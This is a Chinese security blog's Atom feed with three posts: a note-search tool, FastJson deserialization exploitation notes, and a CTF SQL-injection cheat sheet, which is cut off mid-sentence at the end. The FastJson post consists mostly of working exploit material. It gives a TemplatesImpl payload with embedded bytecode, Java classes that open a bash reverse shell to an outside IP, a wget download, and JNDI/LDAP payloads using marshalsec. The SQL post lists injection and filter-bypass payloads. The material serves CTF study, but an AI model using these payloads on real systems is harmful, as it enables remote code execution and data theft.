<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>淡水网志</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.restran.net/"/>
  <updated>2019-05-08T04:43:42.120Z</updated>
  <id>http://www.restran.net/</id>
  
  <author>
    <name>restran</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>为知搜 - 给为知笔记 Mac 版加个离线全文搜索</title>
    <link href="http://www.restran.net/2019/05/08/wiz-search-for-mac/"/>
    <id>http://www.restran.net/2019/05/08/wiz-search-for-mac/</id>
    <published>2019-05-07T16:00:00.000Z</published>
    <updated>2019-05-08T04:43:42.120Z</updated>
    
    <content type="html"><![CDATA[<p>为知笔记已经用了快3年了，里面也累积了2000多篇的笔记，最近换了 Mac 电脑，但是 Mac 版的功能跟Windows 版差太多了，不是很好用，而且 Mac 版的为知笔记在没有网络的时候，无法使用全文搜索。如果去参加 CTF 线下赛，被屏蔽网络，就没法搜索笔记了，只能用脑补，也导致了为知笔记变得很鸡肋，一度想要换个笔记工具。</p><p>分析了一下为知笔记的存储，格式很简单，用了 sqlite 来存储元数据，然后每篇笔记其实是用 ZIP 压缩，将 html 和 网页的图片等内容达成一个压缩包。既然这么简单，那不然自己开发一个全文搜索功能。一开始有考虑要在为知笔记的客户端开源代码上修改，但是用C++写的，看不懂，也懒得去改。</p><p>最后选择了使用 whoosh 和 jieba 分词建立了离线搜索功能，whoosh 是纯 Python 写的一个搜索引擎，使用简单，基本上满足需求。项目代码开源在 GitHub 上 <a href="https://github.com/restran/wiz-search" target="_blank" rel="noopener">wiz-search</a>，具体实现可以查看代码，欢迎使用。</p><p>使用方法</p><ol><li>pip3 install -r requirements.txt</li><li>复制 config.py.example 为 config.py</li><li>修改 WIZ_NOTE_PATH 为正确的路径</li><li>运行 index.py 创建或更新索引</li><li>启动 app.py</li><li>search anything</li></ol><p><img src="/uploads/post_img/2019/05/wiz_search_demo.gif" alt="demo.gif"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;为知笔记已经用了快3年了，里面也累积了2000多篇的笔记，最近换了 Mac 电脑，但是 Mac 版的功能跟Windows 版差太多了，不是很好用，而且 Mac 版的为知笔记在没有网络的时候，无法使用全文搜索。如果去参加 CTF 线下赛，被屏蔽网络，就没法搜索笔记了，只能用脑
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="WizNote" scheme="http://www.restran.net/tags/WizNote/"/>
    
      <category term="全文搜索" scheme="http://www.restran.net/tags/%E5%85%A8%E6%96%87%E6%90%9C%E7%B4%A2/"/>
    
  </entry>
  
  <entry>
    <title>FastJson 反序列化漏洞利用笔记</title>
    <link href="http://www.restran.net/2018/10/29/fastjson-rce-notes/"/>
    <id>http://www.restran.net/2018/10/29/fastjson-rce-notes/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2018-10-30T00:36:35.000Z</updated>
    
    <content type="html"><![CDATA[<p>影响范围</p><p>fastjson &lt;= 1.2.24 </p><h2 id="PoC分类"><a href="#PoC分类" class="headerlink" title="PoC分类"></a>PoC分类</h2><p>1，基于TemplateImpl<br>2，基于JNDI Bean Property类型<br>3，基于JNDI Field类型</p><p>使用Feature.SupportNonPublicField才能打开非公有属性的反序列化处理，@type可以指定反序列化任意类，调用其set，get，is方法，fastjson默认开启type属性。Json 字符串中 @type 要放在最前面，否则没法利用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 反弹shell不能这样写，会没有效果</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"/bin/bash -i &gt;&amp; /dev/tcp/192.168.10.25/3333 0&gt;&amp;1"</span>);</span><br><span class="line"><span class="comment">// 需要写成这样</span></span><br><span class="line"><span class="comment">// bash -c "bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1"</span></span><br><span class="line">Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1"</span>&#125;);</span><br><span class="line"><span class="comment">// 可以执行</span></span><br><span class="line">Runtime.getRuntime().exec(<span class="string">"wget http://x.x.x.x:8080/1.py"</span>);</span><br></pre></td></tr></table></figure><h2 id="基于-TemplateImpl-的-PoC"><a href="#基于-TemplateImpl-的-PoC" class="headerlink" title="基于 TemplateImpl 的 PoC"></a>基于 TemplateImpl 的 PoC</h2><p>Fastjson基于TemplateImpl 的PoC<code>限制还比较多</code>，需要打开SupportNonPublic开关，这个场景是比较少见的。有几个条件：</p><ol><li>目标网站使用fastjson库解析json</li><li>解析时设置了<code>Feature.SupportNonPublicField</code>，否则不支持传入私有属性</li><li>目标使用的jdk中存在<code>TemplatesImpl</code>类</li></ol><p>利用方法</p><ol><li>执行 javac Exploit.java，得到 Exploit.class</li><li>将 Exploit.class 转成 base64，并替换 payload 中的 _bytecodes</li></ol><p>Payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"yv66vgAAADQALAoACgAaCgAbABwHAB0IAB4IAB8IACAKABsAIQcAIgoACAAaBwAjAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEACkV4Y2VwdGlvbnMHACQBAAl0cmFuc2Zvcm0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWBwAlAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYHACYBAApTb3VyY2VGaWxlAQAIUG9jLmphdmEMAAsADAcAJwwAKAApAQAQamF2YS9sYW5nL1N0cmluZwEABGJhc2gBAAItYwEALGJhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC44NS4xMjgvNDU0NSAwPiYxDAAqACsBAANQb2MBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwAhAAgACgAAAAAABAABAAsADAACAA0AAAA/AAUAAQAAAB8qtwABuAACBr0AA1kDEgRTWQQSBVNZBRIGU7YAB1exAAAAAQAOAAAADgADAAAACwAEAAwAHgAPAA8AAAAEAAEAEAABABEAEgABAA0AAAAZAAAABAAAAAGxAAAAAQAOAAAABgABAAAAEwABABEAEwACAA0AAAAZAAAAAwAAAAGxAAAAAQAOAAAABgABAAAAGAAPAAAABAABABQACQAVABYAAgANAAAAJQACAAIAAAAJuwAIWbcACUyxAAAAAQAOAAAACgACAAAAGwAIABwADwAAAAQAAQAXAAEAGAAAAAIAGQ=="</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Poc</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Poc</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        <span class="comment">// Runtime.getRuntime().exec("touch /tmp/success");</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] haFndlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Poc t = <span class="keyword">new</span> Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于-JNDI-的-PoC"><a href="#基于-JNDI-的-PoC" class="headerlink" title="基于 JNDI 的 PoC"></a>基于 JNDI 的 PoC</h2><p>JNDI Bean Property这个类型，这个类型和JNDI Field类型的区别就在于Bean Property需要借助setter，getter方法触发，而Field类型则没有这个必要。JdbcRowSetImpl刚好就在Bean Property分类之下。这个Poc相对于TemplateImpl却没有一点儿限制，当然java在JDK 6u132, 7u122, or 8u113补了是另外一码事。 PoC具体如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://192.168.85.128:1389/Exploit&quot;,&quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>使用 <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a> 监听一个LDAP Server，FastJson反序列的时候，会先去访问 LDAP Server，然后会指向一个 rmi web 目录的地址，FastJson 会去该地址下载对应的.class 文件，然后执行里面的代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 本地监听 1389 端口</span><br><span class="line">java -cp .\target\marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.85.128:8000/#Exploit</span><br><span class="line"></span><br><span class="line"># 执行 payload 后</span><br><span class="line"># Server 会发送：Send LDAP reference result for Exploit redirecting to http://192.168.85.128:8000/Exploit.class</span><br><span class="line"># fastjson 会去访问 http://192.168.85.128:8000/Exploit.class 并执行里面的代码</span><br></pre></td></tr></table></figure><p>Exploit.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Runtime.getRuntime().exec("calc");</span></span><br><span class="line">            java.lang.Runtime.getRuntime().exec(</span><br><span class="line">                    <span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>, <span class="string">"bash -i &gt;&amp; /dev/tcp/192.168.85.128/4545 0&gt;&amp;1"</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译成 class 文件</p><pre><code>javac Exploit.java</code></pre><p><a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a> 需要自己去 GitHub 下载编译成 jar。 </p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="http://xxlegend.com/2018/10/23/%E5%9F%BA%E4%BA%8EJdbcRowSetImpl%E7%9A%84Fastjson%20RCE%20PoC%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">基于JdbcRowSetImpl的Fastjson RCE PoC构造与分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;影响范围&lt;/p&gt;
&lt;p&gt;fastjson &amp;lt;= 1.2.24 &lt;/p&gt;
&lt;h2 id=&quot;PoC分类&quot;&gt;&lt;a href=&quot;#PoC分类&quot; class=&quot;headerlink&quot; title=&quot;PoC分类&quot;&gt;&lt;/a&gt;PoC分类&lt;/h2&gt;&lt;p&gt;1，基于TemplateImpl
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.restran.net/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://www.restran.net/tags/CTF/"/>
    
      <category term="FastJson" scheme="http://www.restran.net/tags/FastJson/"/>
    
  </entry>
  
  <entry>
    <title>CTF 中的 SQL 注入总结</title>
    <link href="http://www.restran.net/2018/10/29/ctf-sqli-notes/"/>
    <id>http://www.restran.net/2018/10/29/ctf-sqli-notes/</id>
    <published>2018-10-28T16:00:00.000Z</published>
    <updated>2018-10-29T15:33:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="flag-常见表"><a href="#flag-常见表" class="headerlink" title="flag 常见表"></a>flag 常见表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select flag from flag</span><br></pre></td></tr></table></figure><h2 id="SQL-注入的基本原理"><a href="#SQL-注入的基本原理" class="headerlink" title="SQL 注入的基本原理"></a>SQL 注入的基本原理</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username=&apos;&apos; and pass=&apos;&apos;</span><br><span class="line"># 构造 username=devnull&apos; or &apos;1后，sql 语句变成</span><br><span class="line">select * from user where username=&apos;devnull&apos; or &apos;1&apos; and pass=&apos;&apos;</span><br></pre></td></tr></table></figure><h2 id="SQLMap"><a href="#SQLMap" class="headerlink" title="SQLMap"></a>SQLMap</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.1.2/get_info.php?title=xxx&amp;order=id&quot; --current-db --batch --flush --tables</span><br></pre></td></tr></table></figure><p>自定义的注入位置，用 * 号表示，如 header 的x-forwarded-for 注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.118.142/&quot; --headers=&quot;X-Forwarded-For: *&quot; --banner</span><br></pre></td></tr></table></figure><h2 id="MySQL中的注释符"><a href="#MySQL中的注释符" class="headerlink" title="MySQL中的注释符"></a>MySQL中的注释符</h2><ul><li><code>#</code> 注释从#字符到行尾</li><li><code>--</code> 注释从–序列到行尾，后面需要跟上一个或多个空格，tab也可以</li><li><code>/* */</code> 注释中间的字符</li></ul><h2 id="获取元数据"><a href="#获取元数据" class="headerlink" title="获取元数据"></a>获取元数据</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># 获取当前的数据库用户，数据库名称，数据库的版本信息</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>(),<span class="keyword">database</span>(),<span class="keyword">version</span>() <span class="keyword">from</span> dual;</span><br><span class="line"># 查询数据库，有时需要限制返回的数量，或者偏移，例如页面只显示一条数据的情况 limit 0,1 limit 1,2</span><br><span class="line"># 需要通过偏移来返回所有的数据库</span><br><span class="line"><span class="keyword">select</span> schema_name <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"># group_concat 函数是将多行数据连接成一行</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata;</span><br><span class="line"># 查询表</span><br><span class="line"># 方法1</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>();  </span><br><span class="line"># 方法2</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'database_name'</span>;</span><br><span class="line"># 方法3</span><br><span class="line"><span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=(<span class="keyword">select</span> <span class="keyword">database</span>());</span><br><span class="line"></span><br><span class="line"># 查询列</span><br><span class="line"><span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'database_name'</span> <span class="keyword">and</span> table_name=<span class="string">'users'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">'flag'</span>;</span><br><span class="line"></span><br><span class="line"># 上面可能会被waf识别，也可以这样</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span>;</span><br><span class="line"></span><br><span class="line"># 字符串可以转换成16进制</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="keyword">group_concat</span>(<span class="keyword">distinct</span>+column_name)) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="number">0x696e666f</span>;</span><br></pre></td></tr></table></figure><h2 id="报错注入的一些技巧"><a href="#报错注入的一些技巧" class="headerlink" title="报错注入的一些技巧"></a>报错注入的一些技巧</h2><h3 id="用不存在的函数，爆出数据库名"><a href="#用不存在的函数，爆出数据库名" class="headerlink" title="用不存在的函数，爆出数据库名"></a>用不存在的函数，爆出数据库名</h3><p>如果过滤了 information_schema，也就无从获取表名和字段信息了，但是如果开启了报错，根据 MySQL 的特性，用一个不存在的自定义函数，就可以爆出数据库名。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">from</span> <span class="keyword">users</span> t <span class="keyword">where</span> t.username=a()</span><br><span class="line">// 报错信息，数据库名是 test_db</span><br><span class="line">[Err] <span class="number">1305</span> - <span class="keyword">FUNCTION</span> test_db.a does <span class="keyword">not</span> exist</span><br></pre></td></tr></table></figure><h3 id="利用-linestring-函数，爆出当前表名"><a href="#利用-linestring-函数，爆出当前表名" class="headerlink" title="利用 linestring 函数，爆出当前表名"></a>利用 linestring 函数，爆出当前表名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1 and linestring(id)</span><br><span class="line">// 报错信息，当前表名是 users</span><br><span class="line">[Err] 1367 - Illegal non geometric &apos;`test_db`.`users`.`id`&apos; value found during parsing</span><br></pre></td></tr></table></figure><h3 id="使用-using-join-获取字段名"><a href="#使用-using-join-获取字段名" class="headerlink" title="使用 using+join 获取字段名"></a>使用 using+join 获取字段名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * from users where id=1 union select * from (select * from users as A join users as B using(id)) as C</span><br><span class="line">// 报错信息，爆出列名 username</span><br><span class="line">[Err] 1060 - Duplicate column name &apos;username&apos;</span><br><span class="line">using中增加新的列名，可以继续爆出其它列名，直到没有报错信息</span><br><span class="line">SELECT * from users where id=1 union select * from (select * from users as A join users as B using(id,username)) as C</span><br><span class="line">// 报错信息，又爆出一个列名</span><br><span class="line">[Err] 1060 - Duplicate column name &apos;password&apos;</span><br></pre></td></tr></table></figure><h2 id="判断字段的数量"><a href="#判断字段的数量" class="headerlink" title="判断字段的数量"></a>判断字段的数量</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 原始的</span><br><span class="line">http://192.168.137.140/cms/show.php?id=35</span><br><span class="line"># 后面加上 order by 数字，就会按照第几个字段进行排序，如果没有会报错</span><br><span class="line">http://192.168.137.140/cms/show.php?id=35 order by 16</span><br></pre></td></tr></table></figure><h2 id="union查询"><a href="#union查询" class="headerlink" title="union查询"></a>union查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># mysql执行：语句正常；</span><br><span class="line"># mssql执行：语句错误，数据类型不匹配，无法正常执行</span><br><span class="line">select id,username from users union select 1,2;     </span><br><span class="line"></span><br><span class="line"># oracle执行：语句错误，数据类型不匹配</span><br><span class="line">select id,username from users union select 1,2 from dual;</span><br></pre></td></tr></table></figure><p>遇到 union 错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 遇到 Illegal mix of collations for operation &apos;UNION&apos;</span><br><span class="line">http://192.168.137.140/cms/show.php?id=999 union select 1,2,group_concat(schema_name) from information_schema.schemata</span><br><span class="line"># 是编码有问题，可以替换成</span><br><span class="line">http://192.168.137.140/cms/show.php?id=999 union select 1,2,hex(group_concat(schema_name)) from information_schema.schemata</span><br><span class="line"></span><br><span class="line"># 返回的结果是16进制，转换一下就可以了</span><br></pre></td></tr></table></figure><h2 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$check= eregi(&apos;select|insert|update|delete|from|or|and|=|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile&apos;, $pass);</span><br></pre></td></tr></table></figure><ul><li>and 用 &amp;&amp; 代替</li><li>or 用 || 代替</li><li>union select from 变成 <code>/*!union*/</code> 这种</li></ul><h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 使用括号，select, from , where 这些关键字不能用括号</span><br><span class="line">select(table_name)from(information_schema.tables)where(table_schema)=database()</span><br><span class="line">// 使用内联注释</span><br><span class="line">select/*1*/username/*1*/from/*1*/users</span><br><span class="line">// 使用%0a 绕过</span><br></pre></td></tr></table></figure><h3 id="关键字写两次"><a href="#关键字写两次" class="headerlink" title="关键字写两次"></a>关键字写两次</h3><p>用 seselectlect 可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/select|union|from|where|insert|update/i'</span>,<span class="string">''</span>,$username)</span><br></pre></td></tr></table></figure><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>用 SELECT 可以绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(<span class="string">'/select|union|from|where|insert|update/'</span>,<span class="string">''</span>,$username)</span><br></pre></td></tr></table></figure><h3 id="16进制绕过"><a href="#16进制绕过" class="headerlink" title="16进制绕过"></a>16进制绕过</h3><p>mysql中字符串都可以转换成对应的16进制形式。</p><p>例如：</p><p><code>1 or 1</code> == <code>0x31206f722031</code></p><p>利用前提：</p><p>1、insert插入时对应字段为字符类型（varchar、char等等）<br>2、SQL语句values时不允许存在单引号。</p><p>例句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">insert into xiaol(id, address) values(1, 0x31206f722031)</span><br></pre></td></tr></table></figure><h3 id="碰到-“-”-等于号被过滤的情况。"><a href="#碰到-“-”-等于号被过滤的情况。" class="headerlink" title="碰到 “=” 等于号被过滤的情况。"></a>碰到 “=” 等于号被过滤的情况。</h3><p>我们知道 = 号，在mysql中常用条件查询（过滤的了话）。可以使用其他条件来进行判断</p><p>可以使用 &lt;&gt; 不等于，也可以改用 like</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&apos; || username like 0x61646d696e)#</span><br><span class="line"># 16进制转换后为，发现admin前后不能加&apos;，否则会找不到数据</span><br><span class="line">1&apos; || username like admin)#</span><br></pre></td></tr></table></figure><p>这里就直接使用了like，(这里说一下小技巧，有时候想 like 模糊查询下，但是有单引号，那么我可以这样写： like 0x2725302d662e6f72672527 （’%0-f.org%’）)</p><p>regexp 后面的参数也可以使用16进制</p><h3 id="regexp-和-like"><a href="#regexp-和-like" class="headerlink" title="regexp 和 like"></a>regexp 和 like</h3><p>当 select 和 () 被过滤的时候，可以用 regexp 和 like 盲注出当前表的字段值</p><p>like 使用 % 和 _ 作为通配符，因此这两个字符无法匹配，需要结合 regexp 搭配使用</p><ul><li>% 表示任意个或多个字符。可匹配任意类型和长度的字符。</li><li>_ 